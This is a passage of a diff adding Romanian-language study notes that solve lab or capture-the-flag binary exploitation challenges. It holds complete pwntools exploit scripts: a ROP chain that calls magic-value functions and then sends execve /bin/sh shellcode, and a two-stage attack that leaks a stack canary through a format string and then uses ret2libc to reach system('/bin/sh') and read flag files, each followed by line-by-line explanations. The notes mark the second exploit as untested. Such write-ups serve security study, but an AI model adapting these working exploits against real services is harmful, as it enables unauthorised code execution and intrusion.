+functii cu argumente SPECIFICE (chain_1(MAGIC_1) si chain_2(MAGIC_2,
+MAGIC_3)) - probabil niste "if"-uri care seteaza flaguri interne doar daca
+argumentele primite coincid cu valori magice hardcodate. Abia dupa ce ambele
+conditii sunt indeplinite, functia last_chance() accepta sa citeasca 64 de
+octeti de la noi SI SA II EXECUTE DIRECT ca shellcode (stiva executabila).
+
+--- Cod final (chain_reaction.py) ---
+from pwn import *
+
+context.binary = './chain_reaction'
+context.arch = 'amd64'
+
+HOST = "10.213.0.102"
+PORT = 40227
+
+POP_RDI_RET = 0x40116a
+POP_RSI_POP_R15_RET = 0x40116c
+CHAIN_1 = 0x401230
+CHAIN_2 = 0x401260
+LAST_CHANCE = 0x4011d4
+
+OFFSET = 72  # 72 = 64 octeti (buffer) + 8 octeti rbp salvat
+
+MAGIC_1 = 0xDEADBEEF # necesar pentru chain_1
+MAGIC_2 = 0xCAFEBABE # primul argument pentru chain_2
+MAGIC_3 = 0xDEADC0DE   # al doilea argument pentru chain_2
+
+p = remote(HOST, PORT)
+
+rop = p64(POP_RDI_RET) + p64(MAGIC_1) + p64(CHAIN_1)
+rop += p64(POP_RDI_RET) + p64(MAGIC_2)
+rop += p64(POP_RSI_POP_R15_RET) + p64(MAGIC_3)
+rop += p64(0) + p64(CHAIN_2) + p64(LAST_CHANCE)
+
+payload = b"A" * OFFSET + rop
+
+
+p.recvuntil(b"chain reaction: ")
+p.sendline(payload)
+
+p.recvuntil(b"juicy: ")
+
+shellcode = asm(shellcraft.amd64.linux.sh())
+log.info(f"Shellcode are {len(shellcode)} octeti (trebuie sa fie <= 64)")
+
+p.send(shellcode)
+
+p.interactive()
+# odata ajunsa la shell, poti rula: cat flag.txt
+
+--- Explicație linie cu linie ---
+POP_RDI_RET = 0x40116a ; POP_RSI_POP_R15_RET = 0x40116c
+  Doua gadgeturi ROP: primul pune o valoare in RDI (primul argument al
+  unei functii, pe System V AMD64), al doilea pune o valoare in RSI (al
+  doilea argument) SI una in R15 (registru "gunoi", fara folos pentru noi,
+  dar care trebuie "consumat" fiindca gadgetul il pop-uieste automat).
+
+CHAIN_1 = 0x401230 ; CHAIN_2 = 0x401260 ; LAST_CHANCE = 0x4011d4
+  Adresele celor trei functii-cheie din program: chain_1 (verifica primul
+  argument), chain_2 (verifica al doilea si al treilea argument), si
+  last_chance (functia care, abia daca ambele verificari anterioare au
+  "marcat" conditia ca satisfacuta - probabil prin variabile globale
+  setate de chain_1/chain_2 - accepta sa citeasca si sa execute shellcode).
+
+OFFSET = 72  # 64 (buffer) + 8 (rbp salvat)
+  Identic ca la little_win: buffer 64 octeti + 8 octeti rbp salvat, pe
+  64-bit, fara canary.
+
+MAGIC_1 = 0xDEADBEEF ; MAGIC_2 = 0xCAFEBABE ; MAGIC_3 = 0xDEADC0DE
+  Valorile EXACTE pe care chain_1 si chain_2 le compara cu argumentele
+  primite (gasite prin analiza disasamblarii - instructiuni "cmp" cu aceste
+  constante hardcodate). Daca argumentele nu coincid EXACT, verificarile
+  interne nu seteaza conditiile necesare pentru last_chance().
+
+rop = p64(POP_RDI_RET) + p64(MAGIC_1) + p64(CHAIN_1)
+  Primul "segment" al lantului: pop rdi (seteaza RDI = urmatoarea valoare
+  de pe stiva) -> MAGIC_1 (valoarea efectiv pusa in RDI) -> CHAIN_1 (apelul:
+  CPU sare aici cu RDI deja = MAGIC_1, deci apelul e echivalent cu
+  chain_1(MAGIC_1) in C).
+
+rop += p64(POP_RDI_RET) + p64(MAGIC_2)
+rop += p64(POP_RSI_POP_R15_RET) + p64(MAGIC_3)
+rop += p64(0) + p64(CHAIN_2) + p64(LAST_CHANCE)
+  Al doilea "segment", pentru apelul chain_2(MAGIC_2, MAGIC_3) - functie cu
+  DOUA argumente, deci avem nevoie de DOUA registre populate (RDI si RSI):
+  pop rdi -> MAGIC_2 (RDI = MAGIC_2, primul argument) -> pop rsi + pop r15
+  -> MAGIC_3, apoi 0 (RSI = MAGIC_3 - al doilea argument; R15 = 0, valoare
+  arbitrara doar ca sa "umplem" acel pop obligatoriu al gadgetului) ->
+  CHAIN_2 (apelul efectiv: chain_2(MAGIC_2, MAGIC_3)) -> LAST_CHANCE (dupa
+  ce chain_2 face ret, CPU sare direct in last_chance(), fara sa mai treaca
+  prin main - lantul complet e astfel: chain_1(M1) -> chain_2(M2,M3) ->
+  last_chance()).
+
+payload = b"A" * OFFSET + rop
+  Umplutura standard pana la adresa de retur, urmata de intregul lant ROP
+  construit mai sus.
+
+p.recvuntil(b"chain reaction: "); p.sendline(payload)
+  Asteapta promptul initial al binarului si trimite payload-ul, declansand
+  overflow-ul si executarea lantului ROP descris.
+
+p.recvuntil(b"juicy: ")
+  Dupa ce lantul ROP a rulat (chain_1 si chain_2 au validat argumentele),
+  executia a ajuns in last_chance(), care tipareste un mesaj ("juicy:") si
+  asteapta sa citeasca pana la 64 de octeti pe care ii va EXECUTA DIRECT
+  ca instructiuni masina (fiindca stiva e marcata executabila - RWX).
+
+shellcode = asm(shellcraft.amd64.linux.sh())
+  Genereaza, cu modulul shellcraft din pwntools, codul masina (shellcode)
+  pentru un shellcode clasic "execve /bin/sh" pe arhitectura amd64/linux,
+  si il asambleaza (asm()) in octeti bruti executabili.
+
+log.info(f"Shellcode are {len(shellcode)} octeti (trebuie sa fie <= 64)")
+  Verificare de siguranta: last_chance() citeste STRICT maxim 64 de octeti,
+  deci shellcode-ul generat TREBUIE sa incapa in aceasta limita (shellcode-ul
+  standard shellcraft.amd64.linux.sh() e suficient de compact, de regula
+  sub 50 octeti).
+
+p.send(shellcode)
+  Trimite shellcode-ul brut; last_chance() il citeste direct pe stiva
+  (deja executabila) si CPU-ul il EXECUTA - acest shellcode face execve
+  catre /bin/sh, obtinand un shell.
+
+p.interactive()
+  Trece in mod interactiv, de unde se poate rula "cat flag.txt" direct in
+  shell-ul obtinut.
+
+
+===============================================================================
+BONUS — love_life — LEAK CANARY (FORMAT STRING) + RET2LIBC ÎN 2 ETAPE
+===============================================================================
+!!! ATENȚIE: această soluție este NOUĂ, gasita RECENT, și NU a fost încă
+RETESTATĂ la laborator. Portul (49723) din script e un PLACEHOLDER și
+TREBUIE actualizat cu portul real al instanței primite înainte de a fi
+folosit la examen/laborator. Nu considera acest exploit 100% confirmat
+functional pana nu il verifici personal pe instanta vie.
+
+--- Context ---
+Binar 64-bit cu canary. O secventa de "prologue" neobisnuita trimite mai
+multe bucati de date catre program inainte de payload-ul propriu-zis
+(un fread de 32 octeti pentru un format string, un index "-1" pentru un
+scanf, si 4 octeti bruti pentru o variabila interna) - probabil necesare ca
+sa trecem de niste verificari interne ale programului inainte sa ajungem la
+punctul vulnerabil real. Dupa acest "prolog", se foloseste un format string
+(%9$p) ca sa leak-am canary-ul, apoi un BOF clasic in 2 etape (leak puts ->
+system("/bin/sh")), identic conceptual cu classic/not_classic/las_vegas, dar
+cu canary-ul corect inclus in payload (de aici denumirea "love_life" - sugereaza
+ca programul "verifica" ceva legat de doua valori care trebuie sa coincida,
+posibil tema narativa a challenge-ului).
+
+--- Cod final (love_life_solve.py) ---
+#!/usr/bin/env python3
+from pwn import *
+import sys
+
+context.binary = elf = ELF('./love_life', checksec=False)
+context.log_level = 'info'
+
+REMOTE = '--remote' in sys.argv
+WS = b'\t\n\x0b\x0c\r '          # scanf %s terminators
+
+POP_RDI     = elf.symbols['lambda']   # pop rdi ; ret
+POP_RSI_RDX = elf.symbols['delta']    # pop rsi ; pop rdx ; ret
+RET         = POP_RDI + 1             # ret  (stack align)
+puts_plt    = elf.plt['puts']
+puts_got    = elf.got['puts']
+main_addr   = elf.symbols['main']
+
+
+def connect():
+    if REMOTE:
+        return remote('10.213.0.102',  49723)
+    return process('./love_life')
+
+
+def prologue(io, fmt):
+    io.send(fmt.ljust(32, b'\x00')[:32])
+    io.sendline(b'-1')
+    io.send(p32(2))
+
+
+def leak_canary(io):
+    prologue(io, b'CAN:%9$p#')
+    io.recvuntil(b'CAN:0x')
+    return int(io.recvuntil(b'#', drop=True), 16)
+
+
+def overflow(io, canary, chain):
+    io.recvuntil(b'Time to say something:')
+    io.sendline(b'A' * 0x88 + p64(canary) + p64(0xdead) + chain)
+
+
+def attempt():
+    io = connect()
+    canary = leak_canary(io)
+    if any(b in WS for b in p64(canary)[1:]):
+        log.info('canary %#x has a whitespace byte, reconnecting', canary)
+        io.close()
+        return None
+
+    log.info('clean canary = %#x', canary)
+
+    overflow(io, canary, p64(POP_RDI) + p64(puts_got) + p64(puts_plt) + p64(main_addr))
+    io.recvuntil(b'Message sent')
+    io.recvline()
+    puts_libc = u64(io.recvline().strip().ljust(8, b'\x00'))
+
+    if REMOTE:
+        libc = ELF('./libLoveLife.so', checksec=False)
+    else:
+        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
+    base = puts_libc - libc.symbols['puts']
+    log.info('puts@libc=%#x  libc base=%#x', puts_libc, base)
+    if base & 0xfff:
+        io.close()
+        return None
+    system_addr = base + libc.symbols['system']
+    binsh = base + next(libc.search(b'/bin/sh'))
+
+    leak_canary(io)                      # same canary, triggers add_summery again
+    overflow(io, canary, p64(RET) + p64(POP_RDI) + p64(binsh) + p64(system_addr))
+    io.recvuntil(b'Message sent')
+    io.sendline(b'echo ===SHELL===; id; cat flag* /flag* 2>/dev/null; ls -la')
+    return io
+
+
+io = None
+for i in range(40):
+    io = attempt()
+    if io:
+        break
+else:
+    log.failure('no clean canary in 40 tries')
+    sys.exit(1)
+
+io.interactive()
+
+--- Explicație linie cu linie ---
+context.binary = elf = ELF('./love_life', checksec=False)
+  Incarca binarul local si il seteaza ca "binar curent" pentru context -
+  pwntools poate folosi automat arhitectura/bitness detectate din fisier
+  (nu mai trebuie sa setam manual context.arch). checksec=False dezactiva
+  afisarea automata a raportului checksec la incarcare (doar cosmetic).
+
+REMOTE = '--remote' in sys.argv
+  Scriptul poate fi rulat fie local (python3 love_life_solve.py, implicit),
+  fie remote (python3 love_life_solve.py --remote), comutand automat intre
+  process() si remote() in functie de argumentul din linia de comanda.
+
+WS = b'\t\n\x0b\x0c\r '
+  Setul de octeti-separator pentru scanf("%s"), identic conceptual cu
+  WHITESPACE de la migratory_bird/the_old_curse, scris aici ca literal de
+  bytes direct (tab, newline, vertical tab, form feed, carriage return,
+  spatiu).
+
+POP_RDI = elf.symbols['lambda']; POP_RSI_RDX = elf.symbols['delta']; RET = POP_RDI + 1
+  Gadgeturile ROP NU sunt gasite la adrese "brute" scrise manual, ci citite
+  din simboluri CU NUME ale binarului (functii numite "lambda" si "delta"
+  in acest binar, care contin exact instructiunile "pop rdi; ret" si
+  respectiv "pop rsi; pop rdx; ret"). RET = POP_RDI + 1 e un truc: in loc
+  de a cauta un gadget "ret" separat, se foloseste faptul ca "pop rdi; ret"
+  e format din 2 instructiuni consecutive - a DOUA instructiune (chiar
+  "ret"-ul) se afla la adresa imediat urmatoare lui POP_RDI (POP_RDI + 1
+  octet, fiindca "pop rdi" e o singura instructiune pe UN octet opcode pe
+  x86-64: 0x5f). Saltand direct la POP_RDI+1, executam DOAR instructiunea
+  "ret" din mijlocul gadgetului, fara sa mai facem "pop rdi" inainte -
+  folosim partial acelasi gadget pentru doua scopuri diferite.
+
+puts_plt / puts_got / main_addr = elf.plt/got/symbols[...]
+  La fel ca in toate ret2libc-urile anterioare: adresele PLT si GOT pentru
+  puts (pentru leak) si adresa lui main() (ca punct de revenire sigur,
+  pentru a reintra in fluxul programului si trimite a doua etapa).
+
+def connect(): if REMOTE: return remote(...) else: return process(...)
+  Functie helper care deschide o conexiune NOUA, fie catre server remote
+  (IP si PORT - port PLACEHOLDER, de actualizat), fie ruland binarul local.
+
+def prologue(io, fmt): io.send(fmt.ljust(32, b'\x00')[:32]); io.sendline(b'-1'); io.send(p32(2))
+  Secventa necesara ca sa trecem de verificari interne ale programului
+  INAINTE de a ajunge la punctul vulnerabil propriu-zis:
+    - fmt.ljust(32, b'\x00')[:32]: trimite exact 32 octeti (completati cu
+      zero-uri la dreapta daca fmt e mai scurt, taiati la 32 daca e mai
+      lung) - acesta e campul citit probabil cu fread(buf, 1, 32, stdin),
+      deci TREBUIE sa aiba exact 32 octeti, altfel se decaleaza restul
+      inputului.
+    - io.sendline(b'-1'): trimite valoarea "-1" la un scanf ulterior -
+      probabil un index folosit de program (similar cu "index"-ul de la
+      Lucky_Charm), ales -1 ca sa treaca o verificare specifica fara efecte
+      secundare nedorite.
+    - io.send(p32(2)): trimite 4 octeti bruti reprezentand intregul 2 -
+      seteaza o variabila interna (comentariul original mentioneaza
+      "a[1]=2 (== a[0])" - probabil o conditie "a[1] trebuie sa egaleze
+      a[0]" care e deja 2 implicit).
+
+def leak_canary(io): prologue(io, b'CAN:%9$p#'); io.recvuntil(b'CAN:0x'); return int(io.recvuntil(b'#', drop=True), 16)
+  Ruleaza "prologul" necesar, dar foloseste ca "fmt" chiar formatul string
+  vulnerabil: "CAN:%9$p#" (prefix si sufix text, usor de reperat/parsat
+  in output, cu %9$p la mijloc - "%p" tipareste direct adresa in format
+  "0x...", fara sa mai trebuiasca sa punem noi "0x" manual ca la "%x").
+  Apoi citeste raspunsul programului pana la "CAN:0x" (asteapta sa apara
+  exact acest prefix in output, confirmand ca am ajuns la linia corecta),
+  si extrage tot ce vine dupa, PANA la caracterul "#" (marcajul nostru de
+  final), convertind rezultatul direct din hexazecimal la intreg - aceasta
+  e valoarea canary-ului.
+
+def overflow(io, canary, chain): io.recvuntil(b'Time to say something:'); io.sendline(b'A'*0x88 + p64(canary) + p64(0xdead) + chain)
+  Functie helper pentru overflow-ul propriu-zis: 0x88 (136) octeti
+  umplutura -> canary-ul CORECT (retrimis identic, trece verificarea de
+  corupere) -> p64(0xdead) (valoare arbitrara pentru saved rbp, nu
+  conteaza continutul) -> "chain" (lantul ROP specific etapei curente,
+  primit ca parametru - functia e reutilizata si pentru etapa 1 si pentru
+  etapa 2, cu lanturi ROP diferite).
+
+canary = leak_canary(io)
+if any(b in WS for b in p64(canary)[1:]): io.close(); return None
+  Leak-ul canary-ului si verificarea standard de whitespace (ignorand
+  primul octet, mereu 0x00) - daca gasim un octet problematic, inchidem
+  conexiunea si semnalam retry (identic conceptual cu migratory_bird_x64).
+
+overflow(io, canary, p64(POP_RDI) + p64(puts_got) + p64(puts_plt) + p64(main_addr))
+  ETAPA 1: trimite overflow-ul cu canary-ul corect, urmat de lantul ROP de
+  leak: pop rdi -> puts@got -> puts@plt -> main (revenire in program).
+  Identic structural cu "classic", dar cu canary inclus intre umplutura
+  si saved rbp.
+
+io.recvuntil(b'Message sent'); io.recvline(); puts_libc = u64(io.recvline().strip().ljust(8, b'\x00'))
+  Citeste marcajul de confirmare al programului ("Message sent"), ignora o
+  linie (probabil un newline/mesaj intermediar), apoi citeste linia care
+  contine octetii bruti ai adresei reale a lui puts(), convertind-o la
+  intreg pe 64 de biti.
+
+if REMOTE: libc = ELF('./libLoveLife.so', checksec=False) else: libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
+  Alege fisierul libc corect in functie de mediu: pentru testare locala,
+  libc-ul SISTEMULUI curent (calea standard Ubuntu/Debian); pentru remote,
+  un fisier libc specific challenge-ului ("libLoveLife.so", probabil pus
+  manual in folder dupa ce a fost identificat/furnizat pentru acest binar).
+
+base = puts_libc - libc.symbols['puts']
+if base & 0xfff: io.close(); return None
+  Calculeaza baza libc-ului ca de obicei (adresa reala - offset static).
+  Verificarea "base & 0xfff" (ultimii 12 biti ai bazei) e o VALIDARE DE
+  SANITATE: bazele reale de incarcare ale bibliotecilor partajate sub
+  Linux sunt INTOTDEAUNA aliniate la pagina de memorie (4096 = 0x1000
+  octeti), deci ultimii 12 biti ai unei baze CORECTE trebuie sa fie TOTI
+  zero. Daca "base & 0xfff" da o valoare nenula, inseamna ca leak-ul a fost
+  corupt/gresit (de exemplu, canary-ul cu whitespace a stricat payload-ul
+  fara sa fi fost prins de verificarea anterioara, sau a aparut alt tip de
+  eroare) - se abandoneaza si se reincearca.
+
+system_addr = base + libc.symbols['system']; binsh = base + next(libc.search(b'/bin/sh'))
+  Adresele reale (baza + offset static) pentru system() si pentru sirul
+  "/bin/sh" din libc-ul ales.
+
+leak_canary(io)                      # same canary, triggers add_summery again
+  Pe ACEEASI conexiune (programul a revenit in main() datorita salt-ului
+  din etapa 1), se repeta secventa de "prolog" + leak canary - NU pentru
+  ca am avea nevoie de o noua valoare (canary-ul e acelasi pe toata durata
+  procesului, fiindca nu s-a repornit), ci fiindca trebuie sa trecem din
+  nou prin fluxul normal al programului (care probabil se numeste
+  "add_summery" sau similar) ca sa ajungem inapoi la punctul unde se poate
+  trimite un nou overflow.
+
+overflow(io, canary, p64(RET) + p64(POP_RDI) + p64(binsh) + p64(system_addr))
+  ETAPA 2: acelasi canary (inca valid, procesul nu s-a schimbat) + lantul
+  ROP final: RET (aliniere stiva, folosind trucul POP_RDI+1 descris mai
+  sus) -> pop rdi -> adresa "/bin/sh" -> adresa system(). Apelul
+  system("/bin/sh") deschide shell-ul.
+
+io.sendline(b'echo ===SHELL===; id; cat flag* /flag* 2>/dev/null; ls -la')
+  In loc sa treaca direct in mod interactiv, scriptul trimite PROACTIV o
+  comanda shell care: afiseaza un marcaj vizual ("===SHELL==="), confirma
+  utilizatorul curent (id), incearca sa citeasca orice fisier care incepe
+  cu "flag" din directorul curent SAU din radacina (/flag*), ascunzand
+  erorile ("2>/dev/null" daca fisierul nu exista), si listeaza continutul
+  directorului curent (ls -la) - util pentru identificarea rapida a
+  flagului fara sa mai fie nevoie de interactiune manuala imediata.
+
+for i in range(40): io = attempt(); if io: break
+  Bucla de retry GLOBALA (40 de incercari, mai multe decat la celelalte
+  challenge-uri, posibil fiindca acest exploit e mai nou/mai putin testat
+  si se doreste o marja mai mare de siguranta): ruleaza intreg procesul
+  attempt() (conectare + leak canary + verificare whitespace + etapa 1 +
+  verificare aliniere baza libc + etapa 2) pana cand totul reuseste si
+  attempt() returneaza un obiect de conexiune valid (nu None).
+
+else: log.failure('no clean canary in 40 tries'); sys.exit(1)
+  Clauza "else" a buclei "for" (se executa DOAR daca bucla s-a terminat
+  NORMAL, fara "break", adica toate cele 40 de incercari au dat gresit) -
+  afiseaza un mesaj de eroare clar si opreste scriptul.
+
+io.interactive()
+  Odata obtinuta o conexiune cu shell functional, trece in mod interactiv
+  pentru a continua manual (comanda shell trimisa automat mai sus a
+  afisat deja id/flag/ls, dar se poate continua cu alte comenzi).
+
+===============================================================================
+NOTĂ FINALĂ
+===============================================================================
+Toate cele 22 de challenge-uri de mai sus au cod final complet si clar in
+materialele sursa (foldere individuale + all_dump.txt) - niciunul nu a
+necesitat presupuneri asupra codului exploit-ului. Pentru love_life (bonus),
+codul e complet, dar NU A FOST RETESTAT: PORTUL din script (49723) e
+placeholder si trebuie actualizat la portul real al instantei, iar fisierul
+libc specific remote ("libLoveLife.so") trebuie confirmat ca exista si e
+corect inainte sa consideri acest exploit garantat functional la examen.
